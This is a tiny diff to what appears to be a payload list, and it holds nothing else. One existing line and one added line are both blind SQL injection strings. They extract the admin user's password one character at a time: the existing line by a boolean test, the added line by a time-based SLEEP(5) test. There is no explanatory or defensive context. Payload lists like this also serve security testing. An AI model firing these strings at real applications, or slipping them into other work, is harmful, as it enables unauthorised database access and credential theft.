@@ -1,1 +1,2 @@
 ﻿1' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a' --
+1' AND IF(SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) --
